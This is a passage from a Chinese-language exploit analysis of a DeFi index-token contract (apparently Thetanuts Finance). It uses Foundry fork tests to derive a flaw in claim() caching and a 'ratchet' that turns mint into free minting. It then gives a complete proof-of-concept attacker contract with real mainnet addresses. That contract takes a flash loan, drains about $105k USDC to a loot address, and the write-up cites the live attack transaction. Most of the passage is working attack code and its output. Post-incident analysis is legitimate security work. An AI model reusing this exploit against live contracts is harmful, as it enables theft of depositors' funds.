        address vault0 = vaultList[0];

        (,, uint256 cache0Before,) = _vaultInfo(vault0);
        uint256 live0Before = IERC20Min(vault0).balanceOf(address(TN));

        console.log("=== CACHE vs LIVE (STEP 3) ===");
        console.log("vault0 cache before", cache0Before);
        console.log("vault0 live  before", live0Before);
        assertEq(cache0Before, live0Before, "sanity: cache == live before desync");

        // Desync: raw transfer 1M vault0 tokens out of TN contract
        address sink = makeAddr("vault0_sink");
        uint256 moveAmount = 1000000;
        vm.prank(address(TN));
        IERC20Min(vault0).transfer(sink, moveAmount);

        (,, uint256 cache0After,) = _vaultInfo(vault0);
        uint256 live0After = IERC20Min(vault0).balanceOf(address(TN));

        console.log("");
        console.log("After raw transfer out", moveAmount);
        console.log("  cache unchanged?", cache0After == cache0Before);
        console.log("  cache", cache0After);
        console.log("  live ", live0After);

        assertEq(cache0After, cache0Before,                "cache must NOT change on raw transfer");
        assertEq(live0After, live0Before - moveAmount,     "live must decrease");

        // Probe claim() with amount where cache vs live predictions differ
        uint256 amount = 500000;
        uint256 predCache = (cache0After * amount) / supply;
        uint256 predLive  = (live0After * amount) / supply;

        console.log("");
        console.log("claim(", amount, ") probe");
        console.log("if cache", predCache);
        console.log("if live ", predLive);
        require(predCache != predLive, "need distinguishable predictions");

        uint256 userBalBefore = IERC20Min(vault0).balanceOf(address(this));
        TN.claim(amount);
        uint256 observed = IERC20Min(vault0).balanceOf(address(this)) - userBalBefore;

        console.log("observed", observed);
        console.log("");

        if (observed == predCache) {
            console.log("=> CONCLUSION: claim() reads CACHED vaults() balance");
        } else if (observed == predLive) {
            console.log("=> CONCLUSION: claim() reads LIVE balanceOf");
        } else {
            revert("unexpected result: matches neither prediction");
        }

        assertEq(observed, predCache, "claim() must use cached balance");
        assertTrue(observed != predLive, "test must distinguish cache from live");
        console.log("STEP 3 PASSED: claim() uses cached balance, not live balanceOf");
    }
```

```
Ran 1 test for test/ClaimReasoning.t.sol:ClaimReasoningTest
[PASS] test_Step3_CacheOrLiveBalance() (gas: 332665)
Logs:
  === CACHE vs LIVE (STEP 3) ===
  vault0 cache before 49716431048
  vault0 live  before 49716431048

  After raw transfer out 1000000
    cache unchanged? true
    cache 49716431048
    live  49715431048

  claim( 500000 ) probe
  if cache 162414
  if live  162410
  observed 162414

  => CONCLUSION: claim() reads CACHED vaults() balance
  STEP 3 PASSED: claim() uses cached balance, not live balanceOf
```

所以用的缓存的



STEP 5: claim 会更新缓存吗？

执行一次真实 claim(1000000) 前后对比

```solidity
    function test_Step4_ClaimUpdatesCachedBalance() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();
        uint256 amount = 1000000;

        (,, uint256 cacheV0Before,) = _vaultInfo(vaultList[0]);
        uint256 supplyBefore = TN.totalSupply();

        console.log("=== CACHE UPDATE (STEP 4) ===");
        console.log("Before claim:");
        console.log("  totalSupply", supplyBefore);
        console.log("  vault0 cache", cacheV0Before);

        TN.claim(amount);

        uint256 supplyAfter = TN.totalSupply();
        (,, uint256 cacheV0After,) = _vaultInfo(vaultList[0]);

        uint256 predictedShare = (cacheV0Before * amount) / supplyBefore;
        uint256 predictedCache = cacheV0Before - predictedShare;
        uint256 predictedSupply = supplyBefore - amount;

        console.log("");
        console.log("After claim:");
        console.log("  totalSupply", supplyAfter);
        console.log("  vault0 cache", cacheV0After);
        console.log("");
        console.log("Expected:");
        console.log("  totalSupply", predictedSupply);
        console.log("  vault0 cache", predictedCache);
        console.log("  share transferred", predictedShare);

        assertEq(supplyAfter, predictedSupply, "totalSupply must decrease by exactly amount");
        assertEq(cacheV0After, predictedCache, "cache must decrease by exactly share");
        console.log("STEP 4 PASSED: claim() correctly decrements cached balance");
    }
```

```
[PASS] test_Step4_ClaimUpdatesCachedBalance() (gas: 297266)
Logs:
  === CACHE UPDATE (STEP 4) ===
  Before claim:
    totalSupply 153054600572
    vault0 cache 49716431048

  After claim:
    totalSupply 153053600572
    vault0 cache 49716106220

  Expected:
    totalSupply 153053600572
    vault0 cache 49716106220
    share transferred 324828
  STEP 4 PASSED: claim() correctly decrements cached balance
```

所以会更新



所以: <span style="color: red;">最终 claim 的算法是</span>:

```
claim(amount):
    supplyBefore = totalSupply()
    _burn(msg.sender, amount)                                         
    for each vault i:
        share = vaults(vault).cachedBalance × amount / supplyBefore   // floor
        vaults(vault).cachedBalance -= share                          
        vault.transfer(msg.sender, share)
```



STEP 6: claim 能放大免费mint的窗口吗?

免费 mint 的上限由这个条件决定（对每个 vault）：

```
vaultBalance × mintAmount < totalSupply
```

瓶颈是余额最大的 vault（V0）。当前：

```
N = floor((totalSupply - 1) / V0余额) = floor((153054600572 - 1) / 49716431048) = 3
```

每次最多免费 mint 3 个。

现在知道了 claim 的公式——`share_i = floor(cache_i × amount / totalSupply)`——claim 会同时减小 totalSupply 和每个 vault 的余额。

**问题是：执行一次 claim 之后，N 会变大吗？** 如果会,直接一次大额 claim 就够了。

设 claim 前 totalSupply = S，瓶颈 vault 余额 = B，claim 量 = A。

claim 后：

```
S' = S - A

B' = B - floor(B × A / S)
   = ceil(B × (S - A) / S)
   = ceil(B × S' / S)
```

因为 ceil(x) ≥ x：

```
B' ≥ B × S' / S
```

两边取倒数、乘以 S'：

```
S' / B' ≤ S' / (B × S' / S) = S / B
```

**也就是 claim 后 S/B 的比值只会变小或持平，不会变大。**

而门槛 N = floor((S-1)/B)，它由 S/B 决定。所以：

```
N' ≤ N
```

**claim 无法单独扩大免费 mint 窗口。**

Fuzz 验证

上述推导假设了 vault0 始终是瓶颈——这在当前区块上成立，但不应依赖假设。

用 Foundry fuzz 测试直接验证：随机 claimAmount ∈ [1, totalSupply-1]，每次现场遍历所有 vault 找出真正的瓶颈，计算 claim 前后门槛，断言不会变大。

```solidity
function testFuzz_Step6_ClaimNeverWidensFreeMintThreshold(uint256 claimAmount) public {
        uint256 supply = TN.totalSupply();
        claimAmount = bound(claimAmount, 1, supply - 1);

        // Acquire tokens (each fuzz iteration starts from clean fork state)
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();

        // Find the bottleneck vault (largest cached balance), don't assume vaultList[0]
        uint256 maxCacheBefore;
        for (uint256 i = 0; i < vaultList.length; i++) {
            (,, uint256 bal,) = _vaultInfo(vaultList[i]);
            if (bal > maxCacheBefore) maxCacheBefore = bal;
        }
        require(maxCacheBefore > 0, "must have at least one vault with positive balance");

        uint256 thresholdBefore = (supply - 1) / maxCacheBefore;

        TN.claim(claimAmount);

        uint256 supplyAfter = TN.totalSupply();

        // Find bottleneck after claim
        uint256 maxCacheAfter;
        for (uint256 i = 0; i < vaultList.length; i++) {
            (,, uint256 bal,) = _vaultInfo(vaultList[i]);
            if (bal > maxCacheAfter) maxCacheAfter = bal;
        }

        uint256 thresholdAfter = (supplyAfter - 1) / maxCacheAfter;

        assertLe(
            thresholdAfter,
            thresholdBefore,
            "claim must never widen the free-mint threshold"
        );
    }
```

运行结果：

```
[PASS] testFuzz_Step6_ClaimNeverWidensFreeMintThreshold(uint256) (runs: 256, μ: 306093, ~: 322789)
```

256 次随机采样，0 次门槛放大。

这意味：claim 不能放大门槛。

但是前面 Step 5 验证了另一个事实：claim(totalSupply-3) 可以把 vault 余额压到 1，此时 S=3，N=2。门槛没有变大（甚至从 3 缩到了 2），但它被「保住」在了非零水平。

|             | claim 前     | claim(totalSupply-3) 后 |
| :---------- | :----------- | :---------------------- |
| totalSupply | 153054600572 | 3                       |
| vault0余额  | 49716431048  | 1                       |
| vault1余额  | 23955277334  | 1                       |
| vault2余额  | 6378688542   | 1                       |
| vault3余额  | 17186382410  | 1                       |
| vault4余额  | 10028704388  | 1                       |
| 免费门槛 N  | 3            | 2                       |


而现在有了 claim 无法放大门槛的证明，可以得出一个关键推论：

> 单独用 claim：门槛只会缩小或持平。
> 单独用 mint：纯 mint(3) 循环要 152 亿轮，不可行。
> 但 **组合**呢？claim 负责把 B 压到 1，mint 在 B 不动的情况下推高 S。

如果 S=3, B=1 → N=2。mint(2) 免费 → S=5, B=1 → N=4。mint(4) 免费 → S=9, B=1 → N=8 ...

这就是 ratchet（棘轮）：claim 压低分母 → 免费 mint 推高分子 → 门槛自我复合膨胀。



### ratchet（棘轮）

#### 验证

验证上一步的推论

```
    function test_Step7_RatchetDerivation() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();

        // --- Phase 1: indexUSDC claims totalSupply-3, pinning S=3, B_i=1 ---
        console.log("=== PHASE 1: pin vault balances to 1 ===");
        uint256 claimAmount = supply - 3;
        TN.claim(claimAmount);

        uint256 s = TN.totalSupply();
        console.log("After claim(totalSupply-3):");
        console.log("  totalSupply", s);
        assertEq(s, 3, "totalSupply should be exactly 3");

        for (uint256 i = 0; i < vaultList.length; i++) {
            (,, uint256 cacheBal,) = _vaultInfo(vaultList[i]);
            console.log("  vault", i, "cachedBalance", cacheBal);
            assertEq(cacheBal, 1, "every vault must have exactly 1 unit");
        }
        console.log("");

        // --- Phase 2: ratchet -- attacker free-mints round by round ---
        console.log("=== PHASE 2: ratchet escalation ===");

        address attacker = makeAddr("ratchet_attacker");

        uint256 round = 0;
        uint256 prevThreshold = 0;

        for (uint256 r = 0; r < 6; r++) {
            // Re-read live state
            s = TN.totalSupply();

            // Find bottleneck
            uint256 maxCache;
            for (uint256 i = 0; i < vaultList.length; i++) {
                (,, uint256 bal,) = _vaultInfo(vaultList[i]);
                if (bal > maxCache) maxCache = bal;
            }

            // Derive threshold: largest N with N * maxCache < totalSupply
            uint256 n = (s - 1) / maxCache;

            console.log("--- round", round, "---");
            console.log("totalSupply", s);
            console.log("maxVaultBalance", maxCache);
            console.log("threshold N", n);

            if (n == 0) {
                console.log("  threshold reached 0 -- ratchet cannot grow further");
                break;
            }

            // Threshold must grow (or at minimum hold) across rounds
            // First round: after claim, threshold may be smaller than
            // pre-claim threshold (3 -> 2). That's expected.
            if (round > 0) {
                assertGt(n, prevThreshold,
                    "threshold must grow round-over-round in the ratchet");
            }
            prevThreshold = n;

            // Record attacker's vault token balances before mint
            uint256[] memory vaultBalBefore = new uint256[](vaultList.length);
            for (uint256 i = 0; i < vaultList.length; i++) {
                vaultBalBefore[i] = IERC20Min(vaultList[i]).balanceOf(attacker);
                assertEq(vaultBalBefore[i], 0,
                    "attacker must hold zero vault tokens throughout the ratchet");
            }

            uint256 attackerTnBefore = TN.balanceOf(attacker);

            // Mint exactly the threshold -- must be free
            vm.prank(attacker);
            TN.mint(n);

            uint256 attackerTnAfter = TN.balanceOf(attacker);
            assertEq(attackerTnAfter - attackerTnBefore, n,
                "mint must credit exactly the minted amount");

            // Vault token balances must NOT have changed (mint was free)
            for (uint256 i = 0; i < vaultList.length; i++) {
                uint256 afterBal = IERC20Min(vaultList[i]).balanceOf(attacker);
                assertEq(afterBal, 0, "attacker must still hold zero vault tokens after free mint");
            }

            // Vault cached balances must NOT have changed
            for (uint256 i = 0; i < vaultList.length; i++) {
                (,, uint256 cacheAfter,) = _vaultInfo(vaultList[i]);
                assertEq(cacheAfter, maxCache,
                    "vault cache must not change during free mint (required=0 for all vaults)");
            }

            round++;
        }

        console.log("");
        console.log("=== RATCHET RESULT ===");
        uint256 finalSupply = TN.totalSupply();
        uint256 attackerBalance = TN.balanceOf(attacker);
        console.log("Final totalSupply:", finalSupply);
        console.log("Attacker TN balance:", attackerBalance);
        console.log("Attacker vault token balance: 0 (all 5 vaults)");
        console.log("Attacker never approved or held any vault token.");
        console.log("STEP 7 PASSED: ratchet verified -- free mint threshold self-compounds");
    }
```

运行结果

```
[PASS] test_Step7_RatchetDerivation() (gas: 996288)
Logs:
  === PHASE 1: pin vault balances to 1 ===
  After claim(totalSupply-3):
    totalSupply 3
    vault 0 cachedBalance 1
    vault 1 cachedBalance 1
    vault 2 cachedBalance 1
    vault 3 cachedBalance 1
    vault 4 cachedBalance 1

  === PHASE 2: ratchet escalation ===
  --- round 0 ---
  totalSupply 3
  maxVaultBalance 1
  threshold N 2
  --- round 1 ---
  totalSupply 5
  maxVaultBalance 1
  threshold N 4
  --- round 2 ---
  totalSupply 9
  maxVaultBalance 1
  threshold N 8
  --- round 3 ---
  totalSupply 17
  maxVaultBalance 1
  threshold N 16
  --- round 4 ---
  totalSupply 33
  maxVaultBalance 1
  threshold N 32
  --- round 5 ---
  totalSupply 65
  maxVaultBalance 1
  threshold N 64

  === RATCHET RESULT ===
  Final totalSupply: 129
  Attacker TN balance: 126
  Attacker vault token balance: 0 (all 5 vaults)
  Attacker never approved or held any vault token.
  STEP 7 PASSED: ratchet verified -- free mint threshold self-compounds
```

得到了验证, 免费mint额度被螺旋推高



#### 免费mint额度能/应该被推到多高 

从 S=3, B=1 起步：

S₀ = 3, N₀ = 2 S₁ = 3+2 = 5, N₁ = 4 S₂ = 5+4 = 9, N₂ = 8 ... S_k = 2^(k+1) + 1, N_k = 2^(k+1)

理论上 可以推到uint256溢出（~255 轮）

但是这不是实操的轮数. 实际的轮数将在下面回答

### 实操

我们前面是在foundry项目中通过 vm.prank(大户) 来模拟大户给我们转账后进行的漏洞触发

现实中,我们需要找人借币才能完成攻击. 在 "找到持有大量 index token 的 holder"一节中, 我们已经找到了, 并且它是闪电贷的金库, 并且他刚好拥有全部的totalSupply, 我们需要借出 totalSupply-3 的币 就往完成攻击

- 借  totalSupply-3 (153054600569)个币

- 调用 claim(153054600569) 这里的调用有2个用途

  1, 将153054600569个代币换成 vault 的 token 进行获利

  2, 将vault 余额压到1,协助触发免费mint的额度

- 还贷, 循环mint铸造出足够多的token来还贷

所以, mint的目的是还贷, 现在就可以回答需要循环铸造多少轮刚好能还贷, 也就是mint额度应该被推到多高

```solidity
    function test_Step8_RatchetToRepayment() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();

        // --- Phase 1: pin to S=3, B=1 ---
        uint256 claimAmount = supply - 3;
        TN.claim(claimAmount);

        // --- Phase 2: ratchet until attacker holds enough to repay ---
        // In a real attack, the SAME address does the claim and the ratchet.
        // We simulate this by having `address(this)` do both — it already
        // holds the vault tokens from claim() and will now mint free TN.
        uint256 target = claimAmount; // need at least this much to repay principal

        console.log("=== RATCHET TO REPAYMENT (STEP 8) ===");
        console.log("Target repayment:", target);
        console.log("");

        uint256 round = 0;
        uint256 s;
        uint256 n;

        while (true) {
            // Derive threshold from live state
            s = TN.totalSupply();

            uint256 maxCache;
            for (uint256 i = 0; i < vaultList.length; i++) {
                (,, uint256 bal,) = _vaultInfo(vaultList[i]);
                if (bal > maxCache) maxCache = bal;
            }

            n = (s - 1) / maxCache;
            if (n == 0) break;

            // Mint — attacker and claimer are the same address
            TN.mint(n);

            // Vault cache must not change (mint is free)
            for (uint256 i = 0; i < vaultList.length; i++) {
                (,, uint256 cacheAfter,) = _vaultInfo(vaultList[i]);
                assertEq(cacheAfter, 1, "vault cache must stay at 1 throughout ratchet");
            }

            round++;

            uint256 bal = TN.balanceOf(address(this));
            console.log("round", round);
            console.log("  mint", n);
            console.log("  totalSupply", s + n);
            console.log("  attacker", bal);

            if (bal >= target) break;
            if (round > 50) {
                console.log("WARNING: exceeded 50 rounds, breaking");
                break;
            }
        }

        console.log("");
        console.log("=== ROUNDS NEEDED: %s ===", round);
        console.log("Final totalSupply:", TN.totalSupply());
        console.log("Attacker TN balance:", TN.balanceOf(address(this)));
        assertGe(TN.balanceOf(address(this)), target,
            "attacker must have minted enough free TN to repay the loan");

        // Attacker still holds the vault tokens from the initial claim
        // (these are the REAL profit — BTC and ETH vault USDC)
        for (uint256 i = 0; i < vaultList.length; i++) {
            uint256 vaultBal = IERC20Min(vaultList[i]).balanceOf(address(this));
            console.log("Attacker vault[%s] balance:", i, vaultBal);
            assertGt(vaultBal, 0, "attacker must still hold vault tokens from claim");
        }

        // All vault caches still at 1
        for (uint256 i = 0; i < vaultList.length; i++) {
            (,, uint256 cacheAfter,) = _vaultInfo(vaultList[i]);
            assertEq(cacheAfter, 1, "every vault cache must still be 1 after ratchet");
        }

        // --- Phase 3: repay the flash loan ---
        address flashLoanPool = 0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA;

        TN.approve(flashLoanPool, target);

        // Pool calls transferFrom to collect repayment
        vm.prank(flashLoanPool);
        TN.transferFrom(address(this), INDEX_USDC, target);

        console.log("");
        console.log("=== REPAYMENT SUCCESS ===");
        console.log("Attacker TN after repayment:", TN.balanceOf(address(this)));
        console.log("indexUSDC TN after repayment:", TN.balanceOf(INDEX_USDC));

        assertGe(TN.balanceOf(address(this)), 0, "attacker should have leftover TN");
        console.log("");
        console.log("STEP 8 PASSED: ratchet can mint enough to repay flash loan");
        console.log("Attacker retains vault tokens from claim + leftover TN after", round, "rounds");
    }
```

```
[PASS] test_Step8_RatchetToRepayment() (gas: 3544353)
Logs:
  === RATCHET TO REPAYMENT (STEP 8) ===
  Target repayment: 153054600569

  round 1
    mint 2
    totalSupply 5
    attacker 5
  round 2
    mint 4
    totalSupply 9
    attacker 9
  round 3
    mint 8
    totalSupply 17
    attacker 17
   
  <省略>
  
  round 36
    mint 68719476736
    totalSupply 137438953473
    attacker 137438953473
  round 37
    mint 137438953472
    totalSupply 274877906945
    attacker 274877906945

  === ROUNDS NEEDED: 37 ===
  Final totalSupply: 274877906945
  Attacker TN balance: 274877906945
  Attacker vault[0] balance: 49716431047
  Attacker vault[1] balance: 23955277333
  Attacker vault[2] balance: 6378688541
  Attacker vault[3] balance: 17186382409
  Attacker vault[4] balance: 10028704387

  === REPAYMENT SUCCESS ===
  Attacker TN after repayment: 121823306376
  indexUSDC TN after repayment: 153054600569

  STEP 8 PASSED: ratchet can mint enough to repay flash loan
  Attacker retains vault tokens from claim + leftover TN after 37 rounds
```

37轮



下面就是最后一个问题: vault token换成真金白银: initWithdraw(uint256) 函数会烧掉vault tokens并将USDC给调用者

```solidity
    function test_Step9_FullInitWithdraw() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        // Claim to get vault tokens
        TN.claim(supply - 3);

        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address[] memory vaultList = _allVaults();

        console.log("=== FULL INITWITHDRAW (STEP 9) ===");
        console.log("");

        uint256 totalUSDC;

        for (uint256 i = 0; i < vaultList.length; i++) {
            address vault = vaultList[i];
            uint256 vaultBal = IERC20Min(vault).balanceOf(address(this));
            uint256 vaultUsdcBal = IERC20Min(USDC).balanceOf(vault);

            console.log("--- vault[%s] %s ---", i, vault);
            console.log("vault token held:", vaultBal);
            console.log("vault USDC bal:  ", vaultUsdcBal);

            if (vaultBal == 0 || vaultUsdcBal == 0) {
                console.log("  (zero USDC -- no value, skipping)");
                console.log("");
                continue;
            }

            // Full withdrawal: transfer ALL tokens to a fresh address,
            // call initWithdraw with the full amount, measure USDC received.
            address probe = makeAddr(string(abi.encodePacked("withdraw_", i)));

            vm.prank(address(this));
            IERC20Min(vault).transfer(probe, vaultBal);

            uint256 usdcBefore = IERC20Min(USDC).balanceOf(probe);

            vm.prank(probe);
            (bool ok,) = vault.call(
                abi.encodeWithSignature("initWithdraw(uint256)", vaultBal)
            );
            require(ok, "initWithdraw failed");

            uint256 usdcReceived = IERC20Min(USDC).balanceOf(probe) - usdcBefore;
            totalUSDC += usdcReceived;

            console.log("initWithdraw(", vaultBal, ")");
            console.log("  USDC received:", usdcReceived);

            // All vault tokens should be burned
            uint256 remainingVaultBal = IERC20Min(vault).balanceOf(probe);
            console.log("  vault token remaining:", remainingVaultBal);
            assertEq(remainingVaultBal, 0, "all vault tokens should be burned");

            // Vault USDC should be fully drained (or nearly so via rounding)
            uint256 vaultUsdcAfter = IERC20Min(USDC).balanceOf(vault);
            console.log("  vault USDC remaining:", vaultUsdcAfter);
            console.log("");
        }

        console.log("=== PROFIT SUMMARY ===");
        console.log("Total USDC extracted:", totalUSDC);
        console.log("                  = $", totalUSDC / 1e6, ".", totalUSDC % 1e6);
        assertGt(totalUSDC, 0, "must extract non-zero USDC");
        console.log("");
        console.log("STEP 9 PASSED: full initWithdraw confirms ~$%s profit", totalUSDC / 1e6);
    }
```

```
[PASS] test_Step9_FullInitWithdraw() (gas: 585911)
Logs:
  === FULL INITWITHDRAW (STEP 9) ===

  --- vault[0] 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59 ---
  vault token held: 49716431047
  vault USDC bal:   71995543702
  initWithdraw( 49716431047 )
    USDC received: 70315563951
    vault token remaining: 0
    vault USDC remaining: 1679979751

  --- vault[1] 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae ---
  vault token held: 23955277333
  vault USDC bal:   35212163722
  initWithdraw( 23955277333 )
    USDC received: 35155935127
    vault token remaining: 0
    vault USDC remaining: 56228595

  --- vault[2] 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8 ---
  vault token held: 6378688541
  vault USDC bal:   0
    (zero USDC -- no value, skipping)

  --- vault[3] 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF ---
  vault token held: 17186382409
  vault USDC bal:   0
    (zero USDC -- no value, skipping)

  --- vault[4] 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71 ---
  vault token held: 10028704387
  vault USDC bal:   0
    (zero USDC -- no value, skipping)

  === PROFIT SUMMARY ===
  Total USDC extracted: 105471499078
                    = $ 105471 . 499078
```

只有前2个 vault 有真钱, 一共 105471499078USDC, 6位小数, 也就是 105471 刀



## POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

// ─── Minimal interfaces ───────────────────────────────────────────

interface ITNIndexPut {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function claim(uint256 amount) external;
    function mint(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashLoanPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// ─── Constants ────────────────────────────────────────────────────

address constant VICTIM      = 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7;
address constant INDEX_USDC  = 0x075dA7e9EFEA6813aB0B2680423df75150120d12;
address constant FLASH_POOL  = 0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA;
address constant USDC        = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant LOOT        = 0xAf3a0FdBFB0e3127247B66a042310e09C32F2299;
uint256 constant FORK_BLOCK  = 25323328;

/// File-level helper: map vault index -> address
function _vault(uint256 i) pure returns (address) {
    if (i == 0) return 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59; // BTC
    if (i == 1) return 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae; // ETH
    if (i == 2) return 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8; // AVAX
    if (i == 3) return 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF; // BNB
    if (i == 4) return 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71; // MATIC
    revert("bad vault index");
}

// ─── Attacker contract ────────────────────────────────────────────

contract Attacker {
    ITNIndexPut constant TN = ITNIndexPut(VICTIM);

    // Called by Aave v2 LendingPool after tokens are transferred
    function executeOperation(
        address[] calldata,     // assets
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,                // initiator
        bytes calldata          // params
    ) external returns (bool) {
        require(msg.sender == FLASH_POOL, "only pool");

        uint256 borrowed = amounts[0];
        uint256 premium  = premiums[0];
        uint256 repay    = borrowed + premium;

        // ── Phase 1: claim all borrowed TN -> get vault tokens, pin S=3, B=1 ──
        TN.claim(borrowed);

        // ── Phase 2: ratchet -- free-mint TN until enough to repay ──
        while (TN.balanceOf(address(this)) < repay) {
            uint256 s = TN.totalSupply();

            // Derive max vault cache from known vaults via low-level call
            uint256 maxCache;
            for (uint256 i = 0; i < 5; i++) {
                (, bytes memory data) = VICTIM.staticcall(
                    abi.encodeWithSignature("vaults(address)", _vault(i))
                );
                // struct: bool active, uint256 weight, uint256 cachedBalance, uint256 reserved
                // cachedBalance is the 3rd field (offset 64 bytes: 32 bool + 32 weight)
                (, , uint256 cachedBalance, ) =
                    abi.decode(data, (bool, uint256, uint256, uint256));
                if (cachedBalance > maxCache) maxCache = cachedBalance;
            }

            uint256 n = (s - 1) / maxCache;
            if (n == 0) revert("ratchet: threshold zero");

            // Mint exactly what's needed on the last round, not the full threshold
            uint256 shortfall = repay - TN.balanceOf(address(this));
            uint256 mintAmount = n < shortfall ? n : shortfall;
            TN.mint(mintAmount);
        }

        // ── Phase 3: approve pool for repayment ──
        TN.approve(FLASH_POOL, repay);

        return true;
    }

    // After flashLoan returns (repayment pulled by pool), withdraw profit.
    function cashOut() external {
        IERC20Min usdc = IERC20Min(USDC);

        for (uint256 i = 0; i < 5; i++) {
            address vault = _vault(i);
            uint256 vaultBal = IERC20Min(vault).balanceOf(address(this));

            if (vaultBal == 0) continue;

            // Only call initWithdraw if vault actually holds USDC
            uint256 vaultUsdcBal = IERC20Min(USDC).balanceOf(vault);
            if (vaultUsdcBal > 0) {
                (bool ok,) = vault.call(
                    abi.encodeWithSignature("initWithdraw(uint256)", vaultBal)
                );
                require(ok, "initWithdraw failed");
            }
        }

        // Transfer USDC profit to loot address
        uint256 profit = usdc.balanceOf(address(this));
        if (profit > 0) {
            usdc.transfer(LOOT, profit);
        }

        // Dump any remaining vault tokens
        for (uint256 i = 0; i < 5; i++) {
            address vault = _vault(i);
            uint256 bal = IERC20Min(vault).balanceOf(address(this));
            if (bal > 0) {
                IERC20Min(vault).transfer(LOOT, bal);
            }
        }
    }
}

// ─── POC Test ─────────────────────────────────────────────────────

contract ThetanutsPOCTest is Test {
    ITNIndexPut constant TN = ITNIndexPut(VICTIM);

    function setUp() public {
        vm.createSelectFork("eth", FORK_BLOCK);
    }

    function test_FullAttack() public {
        Attacker attacker = new Attacker();

        uint256 initialSupply = TN.totalSupply();
        uint256 flashAmount    = initialSupply - 3; // totalSupply - 3

        // ── Snapshot attacker pre-attack balances ─────────────────
        uint256 attackerTnBefore   = TN.balanceOf(address(attacker));
        uint256 attackerUsdcBefore = IERC20Min(USDC).balanceOf(address(attacker));
        uint256 lootUsdcBefore     = IERC20Min(USDC).balanceOf(LOOT);

        assertEq(attackerTnBefore,   0, "attacker starts with 0 TN");
        assertEq(attackerUsdcBefore, 0, "attacker starts with 0 USDC");

        console.log("=== THETANUTS FINANCE POC ===");
        console.log("Block:", FORK_BLOCK);
        console.log("Flash loan amount:", flashAmount);

        // ── Execute flash loan -> triggers attacker.executeOperation ─
        address[] memory assets  = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes   = new uint256[](1);
        assets[0]  = VICTIM;
        amounts[0] = flashAmount;
        modes[0]   = 0; // no debt

        IFlashLoanPool(FLASH_POOL).flashLoan(
            address(attacker),
            assets,
            amounts,
            modes,
            address(attacker),
            "",
            0
        );

        console.log("");
        console.log("Flash loan repaid successfully");

        // ── Verify repayment ──────────────────────────────────────
        // Flash loan repays amount + premium back to indexUSDC (aToken).
        // indexUSDC balance should be >= original supply (premium is extra yield).
        uint256 indexBalAfter = TN.balanceOf(INDEX_USDC);
        assertGe(indexBalAfter, initialSupply,
            "indexUSDC should have at least original supply after repayment");
        console.log("indexUSDC balance:", indexBalAfter);
        console.log("premium:", indexBalAfter - initialSupply);

        // ── Cash out: convert vault tokens -> USDC ─────────────────
        attacker.cashOut();

        uint256 attackerUsdcAfter = IERC20Min(USDC).balanceOf(address(attacker));
        uint256 lootUsdcAfter     = IERC20Min(USDC).balanceOf(LOOT);
        uint256 profit = lootUsdcAfter - lootUsdcBefore;

        console.log("");
        console.log("=== PROFIT ===");
        console.log("USDC to loot:", profit);
        console.log("           = $", profit / 1e6, ".", profit % 1e6);
        console.log("Attacker USDC remaining:", attackerUsdcAfter);

        assertGt(profit, 0, "must extract non-zero profit");
        assertEq(IERC20Min(USDC).balanceOf(address(attacker)), 0,
            "attacker should have transferred all USDC to loot");

        // ── Verify vault tokens emptied from attacker ─────────────
        for (uint256 i = 0; i < 5; i++) {
            uint256 remainingVaultBal = IERC20Min(_vault(i)).balanceOf(address(attacker));
            assertEq(remainingVaultBal, 0, "all vault tokens should be burned or transferred");
        }

        console.log("");
        console.log("POC COMPLETE -- attack simulated successfully");
    }
}

```



```
forge test --match-test test_FullAttack -vvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/POC.t.sol:ThetanutsPOCTest
[PASS] test_FullAttack() (gas: 3434559)
Logs:
  === THETANUTS FINANCE POC ===
  Block: 25323328
  Flash loan amount: 153054600569
  
  Flash loan repaid successfully
  indexUSDC balance: 153192349712
  premium: 137749140
  
  === PROFIT ===
  USDC to loot: 105471499078
             = $ 105471 . 499078
  Attacker USDC remaining: 0
  
  POC COMPLETE -- attack simulated successfully
```



## 线上攻击

Chain ID : 1

TX: 0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec

详细TRACE https://app.blocksec.com/phalcon/explorer/tx/eth/0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec?line=0 

简化Trace

```
0 0 -> CREATE hacker -> deployer . constructor() -> (68 bytes)
